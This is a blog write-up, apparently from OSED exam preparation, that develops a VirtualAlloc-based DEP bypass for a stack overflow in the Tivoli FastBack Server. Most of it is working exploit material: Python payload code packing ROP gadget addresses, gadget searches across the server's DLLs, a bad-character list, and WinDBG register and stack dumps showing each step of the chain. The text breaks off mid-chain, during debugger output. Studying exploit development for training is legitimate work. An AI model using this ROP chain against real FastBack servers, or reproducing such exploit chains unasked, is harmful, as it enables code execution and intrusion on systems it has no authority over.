---
title: "Tivolti Fastback DEP Bypass"
excerpt_separator: "<!--more-->"
categories:
  - Blog
tags:
  - Reverse engineering
  - Exploit development
  - Penetration testing
  - Insecure code
---

In this writeup, we continue building a DEP bypass for the Tivolti Fastback Server. 
The write-up focuses purely on the DEP bypass, as we’ve already created an exploit and will continue building on it.

**WARNING: OSED EXERCISE SPOILERS BELOW.**

<!--more-->

## Table of contents
- [Table of contents](#table-of-contents)
- [Intro](#the-start)
- [Preparing for ROP](#ROP)
- [Selecting Gadgets File](#gadgets)
- [Preparing the Stack](#stack)
- [Obtaining VirtualAlloc Address](#valloca)
- [Patching Return Address](#retadd)
- [Patching Arguments](#parg)
- [Executing VirtualAlloc](#exvalloc)
- [Shellcode Execution](#shellexec)


### Intro(#intro)

`VirtualAlloc` can be used to bypass DEP as it reserves, commit or changes the state of region of pages in the virtual address space of the calling process. We will be invoking the function, and applying the correct parameters. Note that the symbol name within `kernel32.dll` would be `VirtualAllocStub`.

The function prototype is shown below:

```cpp
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType, 
  [in]           DWORD  flProtect
);

Return address => shellcode on stack
lpAddress => point to address of  previously commitd memory page e.g. shellcode on stack
dwSize => 0x01 to 0x1000 ; size of the memory region we want to change, any value between 
flAllocationType => 0x00001000 ; which is MEM_COMMIT
flProtect => 0x00000040 ; 0x40 which is PAGE_EXECUTE_READWRITE
```

Keep in mind the memory addresses are determined based on the stack frames, which is controlled by `EBP`(bottom) and `ESP(top)`.

![Untitled](/assets/Untitled.png)


We always utilize dummy variables to test, we note that it will load the stack bottom up, and we want to ensure `EBP` and our other registers point correctly.

First, the pointer to `VirtualAlloc()` must be at the top of the stack, which is then followed by the following values (parameters) on the stack :

- pointer to memcpy (return address field of VirtualAlloc()). When VirtualAlloc ends, it will return to this address
- lpAddress : arbitrary address (where to allocate new memory. Example 0x00200000)
- size (how big should new memory allocation be)
- flAllocationType (0x1000 : MEM_COMMIT)
- flProtect (0x40 : PAGE_EXECUTE_READWRITE)
- Arbitrary address (same address as lpAddress, this param here will used to jump to shellcode after memcpy() returns). This field is the first parameter to the memcpy() function
- Arbitrary address (again, same address as lpAddress. Parameter here will be used as destination address for memcpy() ). This field is the second parameter to the memcpy() function
- Address of shellcode ( = source parameter for memcpy()). This will be the 3rd parameter to the memcpy() function
- Size : size parameter for memcpy(). This is the last parameter for the memcpy() function

```python
va  = pack("<L", (0x45454545)) # VirutalAlloc Address
va += pack("<L", (0x46464646)) # Return Address (Shellcode on stack)
va += pack("<L", (0x47474747)) # lpAddress (Shellcode on stack)
va += pack("<L", (0x48484848)) # dwSize 
va += pack("<L", (0x49494949)) # flAllocationType 
va += pack("<L", (0x51515151)) # flProtect
```

Let’s look at possible modules to be used for our ROP chains, we all the modules loaded in WinDBG. 

```python
.load narly
!nnmod

0:001> !nmod
~~001d0000 001fd000 libcclog             /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\libcclog.dll
00400000 00c0c000 FastBackServer       /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe
00fe0000 01013000 snclientapi          /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\snclientapi.dll~~
01320000 01362000 NLS                  /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\Common\NLS.dll
013a0000 013cb000 gsk8iccs             /SafeSEH OFF                C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll
01430000 0146a000 icclib019            /SafeSEH ON  /GS            C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll
03080000 03170000 libeay32IBM019       /SafeSEH OFF                C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll
10000000 1003d000 SNFS                 /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\SNFS.dll
50200000 50237000 CSNCDAV6             /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\server\CSNCDAV6.DLL
~~50500000 50577000 CSFTPAV6             /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL~~
51000000 51032000 CSMTPAV6             /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\server\CSMTPAV6.DLL
```

Based on the output, we see the following options available to us. The first three options would invoke NULL bytes e.g. 001 and 004 on the address space, so we skip them. We previously used `CSFTPAV6.DLL` and as this is for extra practice, we skip the module. We end up using the following three files:

```python
CSMTPAV6.DLL
CSNCDAV6.DLL
SNFS.DLL
```

### Preparing for ROP(#ROP)

We don’t have to do much to prepare for our ROP chain, we’ve already worked out the offsets in our previous endeavors as shown below.

```python
#3. We set our ROP buffer
offset = b"A" * 276
eip = b"B" * 4
rop = b"C" * (0x400 - 276 - 4) 
```

We replace our offsets with our required function and parameters to load `VirtualAlloc`. We adjust our exploit as shown below.

```python
va  = pack("<L", (0x45454545)) # VirutalAlloc Address
va += pack("<L", (0x46464646)) # Return Address (Shellcode on stack)
va += pack("<L", (0x47474747)) # lpAddress (Shellcode on stack)
va += pack("<L", (0x48484848)) # dwSize 
va += pack("<L", (0x49494949)) # flAllocationType 
va += pack("<L", (0x51515151)) # flProtect

#### Reminder of how the values would be entered based on the function prototype ####
# lpAddress => point to address of  previously commitd memory page e.g. shellcode on stack
# dwSize => 0x01 to 0x1000 ; size of the memory region we want to change, any value between 
# flAllocationType => 0x00001000 ; which is MEM_COMMIT
# flProtect => 0x00000040 ; 0x40 which is PAGE_EXECUTE_READWRITE

offset = b"A" * (276 - len(va))
eip = b"B" * 4
rop = b"C" * (0x400 - 276 - 4) 

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset + va + eip + rop ,0,0,0,0)
buf += formatString

```

We confirm that our everything loads correctly as shown below by running `dd esp - 1C` in our WinDBG debugger.

```python
0:079> dd esp - 1C
**0d4fe300  45454545 46464646 00000000 48484848
0d4fe310  00000000 51515151** 42424242 43434343
0d4fe320  43434343 43434343 43434343 43434343
0d4fe330  43434343 43434343 43434343 43434343
0d4fe340  43434343 43434343 43434343 43434343
0d4fe350  43434343 43434343 43434343 43434343
0d4fe360  43434343 43434343 43434343 43434343
0d4fe370  43434343 43434343 43434343 43434343
```

We see that our `lpAddress` and `flAllocationType` parameters doesn’t load properly, however, we ignore it for now as we will be replacing them with the correct values. Based on our previous knowledge we know the bad characters are `0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20`. We have successfully prepared our exploit for the `VirtualAlloc` DEP bypass. 

### Selecting Gadgets File (#gadgets)

We copy three files we would like to utilise to a folder.

```python
copy "C:\Program Files\Tivoli\TSM\FastBack\server\CSNCDAV6.DLL"
copy "C:\Program Files\Tivoli\TSM\FastBack\server\CSMTPAV6.DLL"
copy "C:\Program Files\Tivoli\TSM\FastBack\server\SNFS.DLL"
```

We then run *RP-WIN-X86.exe* to generate our gadgets into a file. 

```python

..\rp-win-x86.exe -f CSNCDAV6.DLL -r 5 > CSNCDAV6.DLL.txt
..\rp-win-x86.exe -f CSMTPAV6.DLL -r 5 > CSMTPAV6.DLL.txt
..\rp-win-x86.exe -f SNFS.DLL -r 5 > SNFS.DLL.txt

```

Lastly, we utilise our own script that will sort the gadgets similiar to the find-gadgets python script. I can definitely advise looking at the goodies in the repository [https://github.com/epi052/osed-scripts](https://github.com/epi052/osed-scripts).

```python
./rop-sorter.ps1 ./ROPS
```

Our output from the above will look like the below. I’ve rather using the script as there is some modiciations for specific searches made. 

![Untitled](/assets/Untitled%201.png)

![Untitled](/assets/Untitled%202.png)

### Preparing the Stack (#stack)

We need to find the stack address of our current dummy registers, this can be done by using the value in `ESP`. We can’t modify `ESP` as it will point to the next gadget, however, we can copy it to another register. The following ways can be used to obtain a copy of the `ESP` register. Important to ensure we are carried towards our next ROP chain values else execution will not continue.

```python
mov XXX, XXX; ret
xchg XXX, XXX; ret
pop XXX; mov XXX, XXX; ret
lea XXX, [XXX]; ret
```

We look for gadgets, we rely on a mix of our sorted ROP gadget output file and performing manual searching using ***gci*** command pointed to our ROPS folder. In the below example, we look for `PUSH ESP` gadgets.

```python

gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(push esp).*?((retn  ;)|(ret  ;))"

ROPS\CSMTPAV6.DLL.txt:10470:0x5100fdda: push esp ; and al, 0x10 ; mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:10471:0x5100e8b3: push esp ; and al, 0x10 ; mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:10474:0x5100fbd2: push esp ; push es ; add dl, byte [ecx+0x3B] ; ret  ;  (1 found)
ROPS\CSMTPAV6.DLL.txt:11781:0x5100fbd0: sbb al, 0xA1 ; push esp ; push es ; add dl, byte [ecx+0x3B] ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:5326:0x50213e39: nop  ; push esp ; or eax, dword [eax] ; add cl, cl ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:8393:0x5020545f: push esp ; and al, 0x10 ; mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:8394:0x50206d02: push esp ; and al, 0x10 ; mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:8395:0x50216325: push esp ; leave  ; ret  ;  (1 found)
ROPS\CSNCDAV6.DLL.txt:8398:0x50213e3a: push esp ; or eax, dword [eax] ; add cl, cl ; ret  ;  (1 found)
ROPS\ropssnfs.txt:3996:0x1001e4bf: add dword [eax-0x75], ebx ; push esp ; and al, 0x10 ; pop esi ; mov dword [edx], ecx ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17593:0x10001155: push esp ; add dl, byte [eax] ; mov eax, dword [ebp-0x04] ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17594:0x1000124d: push esp ; add dl, byte [eax] ; mov eax, dword [ebp-0x04] ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17595:0x10002b6d: push esp ; add dl, byte [eax] ; mov eax, dword [ebp-0x04] ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17596:0x1000386d: push esp ; add dl, byte [eax] ; mov eax, dword [ebp-0x04] ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17597:0x1000129d: push esp ; add dl, byte [eax] ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17598:0x1000144d: push esp ; add dl, byte [eax] ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17599:0x10011520: push esp ; add eax, 0x20 ; pop ebx ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17601:0x1000cb77: push esp ; and al, 0x10 ; mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17602:0x1001e4c2: push esp ; and al, 0x10 ; pop esi ; mov dword [edx], ecx ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17604:0x1000a505: push esp ; push eax ; add dl, byte [eax] ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17606:0x1000970a: push esp ; push ebx ; add dl, byte [eax] ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17608:0x10007118: push esp ; push ecx ; add dl, byte [eax] ; pop ebp ; ret  ;  (1 found)
**ROPS\ropssnfs.txt:17610:0x10019df4: push esp ; push edx ; add dl, byte [eax] ; pop esi ; ret  ;  (1 found)**
ROPS\ropssnfs.txt:17611:0x1000144c: push esp ; push esp ; add dl, byte [eax] ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\ropssnfs.txt:17612:0x1001e4a6: push esp ; ret  ;  (1 found)
**ROPS\ropssnfs.txt:17613:0x100113dd: push esp ; sub eax, 0x20 ; pop ebx ; ret  ;  (1 found)**

```

From the above we see a couple of options and select the `0x100113dd` option as it will copy `ESP` into `EBX` without have any adverse affect on the stack. Reminder of our bad chars: `0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20`. We need to update our POC so that `EIP` points to our first gadget.

```python
eip = pack("<L", (0x100113dd)) # push esp ; sub eax, 0x20 ; pop ebx ; ret  ;

#set a breakpoint step through the instructions and ensure everything executes
bp 0x100113dd
```

Putting it all together, the `push esp ; sub eax, 0x20 ; pop ebx ; ret` ****ROP gadget saves the current value of `ESP` on the stack, subtracts `0x20` from `EAX`, pops the original value of `ESP` from the stack into `EBX`. We check the execution and ensure that `EBX` has the correct value now, which should be our `ESP` value.

```python
0:079> bp 0x100113dd

#we step the instructions
0:077> r
eax=ffffffe0 **ebx=0d84e31c** ecx=0d84ca70 edx=77e623b0 esi=0639d040 edi=00669360
eip=100113e2 **esp=0d84e31c** ebp=51515151 iopl=0         nv up ei ng nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283
SNFS!toupper+0x1d:
100113e2 c3              ret
```

We can see that our `EBX` and `ESP` registers point to the same value.

### Obtaining VirtualAlloc Address (#valloca)

We need to obtain the location of our `VritualAlloc` from the IAT table. We first verify if this is imported using IDA from the imports table. Our process will be as follow:

- Obtain address on stack where the dummy DWORD is e.g. dummy `VirtualAlloc`Address
- resolve the address of `VirtualAlloc` e.g. fetch the correct address
- Write that value to top of the placeholder value e.g. patch the chain to point to `VirtualAlloc`

Inspect the IAT table using IDA PRO e.g. *Imports* tab and get the address for `VirtualAlloc`. We therefore loaded `SNFS.DLL` into IDA. We identify our location as `0x100252E0`. 

![Untitled](/assets/Untitled%203.png)

```python
0:066> dds 0x100252E0
100252e0  77383db0 KERNEL32!VirtualAllocStub
100252e4  7738a430 KERNEL32!IsBadWritePtr
100252e8  773828a0 KERNEL32!IsBadReadPtr
```

As we are pushing `0x45454545` onto the stack as a dummy value, we want to identify where on the stack our dummy address is as shown below. 

```python
0:077> dd esp - 40
0d84e2dc  41414141 41414141 41414141 41414141
0d84e2ec  41414141 41414141 41414141 41414141
0d84e2fc  41414141 45454545 46464646 00000000
0d84e30c  48484848 00000000 51515151 0d84e31c
0d84e31c  50215471 ffffffe4 10012ef4 42424242
0d84e32c  43434343 43434343 43434343 43434343
0d84e33c  43434343 43434343 43434343 43434343
0d84e34c  43434343 43434343 43434343 43434343
0:077> ?0d84e2fc + 4
Evaluate expression: 226812672 = 0d84e300
0:077> ?0d84e2fc + 0x04
Evaluate expression: 226812672 = 0d84e300
0:077> ? esp - 0d84e300
Evaluate expression: 28 = 0000001c
0:077> .formats 0000001c
Evaluate expression:
  Hex:     0000001c
  Decimal: 28
  Octal:   00000000034
  Binary:  00000000 00000000 00000000 00011100
  Chars:   ....
  Time:    Wed Dec 31 16:00:28 1969
  Float:   low 3.92364e-044 high 0
  Double:  1.38338e-322
```

From the above we learn that we need to move `0x1C` bytes from `ESP` e.g. `ESP - 0x1C` to reach our `VirtualAlloc` Address. Because we control `ESP`, we looking at where our example landed. Since we have a copy of `ESP` in the `EBX` register, we need a gadget similar to the following:

```python
SUB EBX, 0x1C
RETN
```

Since we can't find the gadget, we have reached a pitfall and need to get a bit more creative. Refer to the *********Pitfalls********* section for information about various pitfalls and how to overcome them.

```python
gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(sub ebx).*?((retn  ;)|(ret  ;))"
###no results###
```

To overcome our pitfall, we can put the `0x1C` value on the stack as part of the overflowing buffer, then pop the value into another register of our choice using a gadget. This would allow us to subtract the two registers (`EBX`- `0x1C`) to get our desired result. We note another pitfall here as we can see from the below `0000001c` contains several null bytes.

```python
0:077> .formats 0x1C
Evaluate expression:
  Hex:     0000001c
```

To overcome this, we can use one of our tricks to add the inverse, which would be seen as a very large value `-0x1C` that contains no null bytes.

```python
0:077> .formats -0x1C
Evaluate expression:
  Hex:     ffffffe4
  Decimal: -28
```

Effectively instead of using `ebx - 0x1c` bytes, we can utilize `ebx + -0x1c`bytes which will result in the same result, however, we won’t have any null bytes. 

```python
0:077> ? ebx - 0x1c
Evaluate expression: 226812672 = 0d84e300
0:077> ? ebx + -0x1c
Evaluate expression: 226812672 = 0d84e300
```

Let’s plan which gadgets would have to be used next. Considering that `EBX` which currently stores our `ESP` value is not as commonly used, we will first move the `EBX` value into another register which we will hopefully find gadgets for during our calculations. 

*Note that, you’d have to sometimes retrace your steps to come back to earlier ROP gadgets to ensure a path forward.*

1. Copy `EBX` to `EAX` ; *note `EBX` stores our saved `ESP` value*. We need to perform some stack adjustments, hence the additional ROP gadgets that makes up for the additional instructions.
    
    ```python
    gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(mov eax, ebx).*?((retn  ;)|(ret  ;))"
    ....
    ROPS\ropssnfs.txt:11559:0x100117ba: mov eax, ebx ; pop esi ; pop ebx ; leave  ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:11560:0x10023069: mov eax, ebx ; pop esi ; pop ebx ; leave  ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:11561:0x10013b02: mov eax, ebx ; pop esi ; pop ebx ; pop ebp ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:11562:0x10012394: mov eax, ebx ; pop esi ; pop ebx ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:11563:0x1000fa5c: mov eax, ebx ; pop esi ; pop edi ; pop ebx ; pop ebp ; ret  ;  (1 found)
    .....
    rop = pack("<L", (0x10012394)) # mov eax, ebx ; pop esi ; pop ebx ; ret  ;  (1 found)
    rop += pack("<L", (0x42424242)) # pop esi
    rop += pack("<L", (0x42424242)) # pop ebx 
    ```
    
2. `POP` the `-0x1C` into `ECX`
    
    ```python
    
    gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(pop e[a-z][a-z]).*?((retn  ;)|(ret  ;))"
    ....
    ROPS\ropssnfs.txt:14441:0x10021dbf: pop ecx ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:14442:0x10021db3: pop ecx ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:14443:0x10022547: pop ecx ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:14444:0x10022a64: pop ecx ; ret  ;  (1 found)
    ....
    rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
    rop += pack("<L", (0xffffffe4)) # -0x1C
    ```
    
3. Add`ECX` to `EAX`
    
    ```python
    gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(add eax, ecx).*?((retn  ;)|(ret  ;))"
    ....
    ROPS\CSNCDAV6.DLL.txt:1494:0x50217e03: add eax, ecx ; pop esi ; pop edi ; pop ebx ; leave  ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:4378:0x10024108: add eax, ecx ; pop edi ; pop esi ; pop ebx ; leave  ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:4379:0x10012ef4: add eax, ecx ; pop esi ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:4433:0x10012ef2: add ecx, edx ; add eax, ecx ; pop esi ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:7653:0x10012eed: dec ecx ; or byte [ebx-0x35FCF1F4], cl ; add eax, ecx ; pop esi ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:11935:0x10012eec: mov ecx, dword [ecx+0x08] ; mov ecx, dword [esi+ecx] ; add ecx, edx ; add eax, ecx ; pop esi ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:11942:0x10012eef: mov ecx, dword [esi+ecx] ; add ecx, edx ; add eax, ecx ; pop esi ; ret  ;  (1 found)
    ROPS\ropssnfs.txt:12580:0x10012ef0: or al, 0x0E ; add ecx, edx ; add eax, ecx ; pop esi ; ret  ;  (1 found)
    ....
    rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret  ;
    rop += pack("<L", (0x42424242)) # pop esi
    ```
    

Effectively our ROP chain will now look as follows:

```python
va  = pack("<L", (0x45454545)) # VirutalAlloc Address
va += pack("<L", (0x46464646)) # Return Address (Shellcode on stack)
va += pack("<L", (0x47474747)) # lpAddress (Shellcode on stack)
va += pack("<L", (0x48484848)) # dwSize 
va += pack("<L", (0x49494949)) # flAllocationType 
va += pack("<L", (0x51515151)) # flProtect

offset = b"A" * (276 - len(va))
eip = pack("<L", (0x100113dd)) # push esp ; sub eax, 0x20 ; pop ebx ; ret  ;

#bad chars:  0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20
rop = pack("<L", (0x10012394)) # mov eax, ebx ; pop esi ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop esi
rop += pack("<L", (0x42424242)) # pop ebx 

rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi

rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Once we hit our breakpoint on `0x10012394` we check that our stack aligns correctly.

```python
0:006> r
eax=0d46e31c ebx=0d46e31c ecx=0d46ca70 edx=77e623b0 esi=0601b880 edi=00669360
eip=10012396 esp=0d46e320 ebp=51515151 iopl=0         nv up ei ng nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283
SNFS!_flush+0x59:
10012396 5e              pop     esi

0:006> dd esp
0d46e320  42424242 42424242 10022a64 ffffffe4
0d46e330  10012ef4 42424242 43434343 43434343
0d46e340  43434343 43434343 43434343 43434343
0d46e350  43434343 43434343 43434343 43434343
0d46e360  43434343 43434343 43434343 43434343
0d46e370  43434343 43434343 43434343 43434343
0d46e380  43434343 43434343 43434343 43434343
0d46e390  43434343 43434343 43434343 43434343
```

We continue stepping through our instructions of our exploit and now note that we have calculated the offset correctly so `EAX` point to our address with the `VirtualAlloc` dummy value of `0x45454545`.

```python
0:006> r
eax=0d46e300 ebx=42424242 ecx=ffffffe4 edx=77e623b0 esi=42424242 edi=00669360
eip=10012ef7 esp=0d46e338 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
SNFS!_DestructExceptionObject+0x89:
10012ef7 c3              ret

0:006> dd esp
0d46e338  43434343 43434343 43434343 43434343
0d46e348  43434343 43434343 43434343 43434343

0:006> dd eax
0d46e300  45454545 46464646 00000000 48484848
0d46e310  00000000 51515151 0d46e31c 10012394
0d46e320  42424242 42424242 10022a64 ffffffe4
0d46e330  10012ef4 42424242 43434343 43434343
```

Looking at our IAT table we know the `VirtualAlloc` is at `0x100252E0` when imported. We pop the value into a register such as `ECX`.

```python
rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
rop += pack("<L", (0x100252E0)) # VirtualAlloc Address
```

Next we take a step back, we would need various gadgets to be executed and we would have to work with what we have. Usually a ROP chain is lots of trail and error and we look ahead when selecting gadgets as some gadgets can be harder to find than others.

We need to patch our `VirtualAlloc` address into the memory location pointed to by our current `EAX` register. We therefore search for some options as shown below.

```python
## write-what-where gadgets ##
+--    MTPAV6.DLL.txt:5190:0x51007bc5: mov dword [eax], ecx ; pop ebp ; ret  ;  (1 found)
+--    MTPAV6.DLL.txt:5191:0x51007bd6: mov dword [eax], ecx ; pop ebp ; ret  ;  (1 found)
+--    MTPAV6.DLL.txt:5192:0x51007be7: mov dword [eax], ecx ; pop ebp ; ret  ;  (1 found)
+--    NCDAV6.DLL.txt:4260:0x50206ec0: mov dword [eax], ecx ; pop ebp ; ret  ;  (1 found)
+--    NCDAV6.DLL.txt:4261:0x50206eaf: mov dword [eax], ecx ; pop ebp ; ret  ;  (1 found)
+--    NCDAV6.DLL.txt:4262:0x50206ed1: mov dword [eax], ecx ; pop ebp ; ret  ;  (1 found)
+--    NCDAV6.DLL.txt:4333:0x50205462: mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
+--    NCDAV6.DLL.txt:4334:0x50206d05: mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
+--    NFS.dll.txt:9565:0x1001e57e: mov dword [eax], ecx ; pop esi ; ret  ;  (1 found)
+--    NFS.dll.txt:9566:0x1001526c: mov dword [eax], ecx ; ret  ;  (1 found)
+--    NFS.dll.txt:9668:0x10020ba3: mov dword [ecx], edx ; ret  ;  (1 found)
+--    NFS.dll.txt:9669:0x10020bb3: mov dword [ecx], edx ; ret  ;  (1 found)
+--    NFS.dll.txt:9670:0x10021c99: mov dword [ecx], edx ; ret  ;  (1 found)
+--    NFS.dll.txt:9671:0x10021cbd: mov dword [ecx], edx ; ret  ;  (1 found)
+--    NFS.dll.txt:9570:0x10020daa: mov dword [eax], edx ; ret  ;  (1 found)
+--    NFS.dll.txt:9571:0x10021d7c: mov dword [eax], edx ; ret  ;  (1 found)
```

We clearly have some options when we look at the above. We now also need to consider that at this point, we only have the address `0x100252E0` which points to the memory location of `KERNEL32!VirtualAlloc`, which is at the `0x77383db0` address. We need to have our register equal to the memory location within the address. We therefore look at further options something like `mov eax, dword [eax]` or similar would result in our `EAX` register equaling `0x77383db0` correctly.

```python
gci .\ROPS  -File -Recurse -EA SilentlyContinue | Select-String -Pattern "(mov eax, dword \[eax\]).*?((retn  ;)|(ret  ;))"  | Select-String -Pattern "(leave)" -NotMatch
ROPS\SNFS.dll.txt:9830:0x10003ae7: mov eax, dword [eax] ; mov esp, ebp ; pop ebp ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:9831:0x10021505: mov eax, dword [eax] ; pop esi ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:9832:0x100218f3: mov eax, dword [eax] ; pop esi ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:9833:0x10015fee: mov eax, dword [eax] ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:9834:0x10020b93: mov eax, dword [eax] ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:9835:0x10021c89: mov eax, dword [eax] ; ret  ;  (1 found)
ROPS\SNFS.dll.txt:9959:0x10003ae4: mov eax, dword [ebp-0x04] ; mov eax, dword [
```

We quickly note that the above would not really work considering we mostly need our `EAX` register pointing to the memory location that needs to be patched. We further investigate our options and we identify `push ebp ; add edx, dword [eax] ; pop eax ; ret` at `0x10019c61` as a great alternative. We specifically choose this gadget as it allows us to utilise other gadgets that copy `EAX` into `EBP`. With some trail and error we update our ROP gadget as follows

```python
##OBTAINING VIRTUALALLOC ADDRESS
rop = pack("<L", (0x10012394)) # mov eax, ebx ; pop esi ; pop ebx ; ret  ;  (1 found)
rop += pack("<L", (0x42424242)) # pop esi
rop += pack("<L", (0x42424242)) # pop ebx 
rop += pack("<L", (0x10022a64)) # pop ecx ; ret  ;
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x10012ef4)) # add eax, ecx ; pop esi ; ret  ;
rop += pack("<L", (0x42424242)) # pop esi

rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ;  (1 found)
rop += pack("<L", (0x10014429)) # pop eax ; ret  ;
rop += pack("<L", (0x100252E0)) # VirtualAlloc Address
rop += pack("<L", (0x5021db6c)) #  xor edx, edx ; ret  ;  (1 found)
rop += pack("<L", (0x10019c61)) # push ebp ; add edx, dword [eax] ; pop eax ; ret  
rop += pack("<L", (0x10021d7c)) # mov dword [eax], edx ; ret  ;
```

Lets step through the instructions step by step to explain. 

1. We copy our `EAX` value to `EBP` as we will be using the `EAX` register for the next instructions.
    
    ```python
    rop += pack("<L", (0x50218139)) # push eax ; pop ebp ; ret  ;  (1 found)
    
    eax=019ee2f0 ebx=42424242 ecx=ffffffe4 edx=770313a0 esi=42424242 edi=00669360
    eip=50218139 esp=019ee32c ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
    CSNCDAV6!EncodeFileW+0xdfe1:
    50218139 50              push    eax
    0:001> p
    eax=019ee2f0 ebx=42424242 ecx=ffffffe4 edx=770313a0 esi=42424242 edi=00669360
    eip=5021813a esp=019ee328 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
    CSNCDAV6!EncodeFileW+0xdfe2:
    5021813a 5d              pop     ebp
    0:001> p
    eax=019ee2f0 ebx=42424242 ecx=ffffffe4 edx=770313a0 esi=42424242 edi=00669360
    eip=5021813b esp=019ee32c ebp=019ee2f0 iopl=0         nv up ei pl nz ac pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
    CSNCDAV6!EncodeFileW+0xdfe3:
    5021813b c3              ret
    ```
    
2. We pop `0x100252E0` into the `EAX` register as per our IAT table.
    
    ```python
    rop += pack("<L", (0x10014429)) # pop eax ; ret  ;
    rop += pack("<L", (0x100252E0)) # VirtualAlloc Address
    
    0:001> p
    eax=019ee2f0 ebx=42424242 ecx=ffffffe4 edx=770313a0 esi=42424242 edi=00669360
    eip=10014429 esp=019ee330 ebp=019ee2f0 iopl=0         nv up ei pl nz ac pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
    SNFS!_heap_init+0x5b:
    10014429 58              pop     eax
    0:001> p
    eax=100252e0 ebx=42424242 ecx=ffffffe4 edx=770313a0 esi=42424242 edi=00669360
    eip=1001442a esp=019ee334 ebp=019ee2f0 iopl=0         nv up ei pl nz ac pe cy
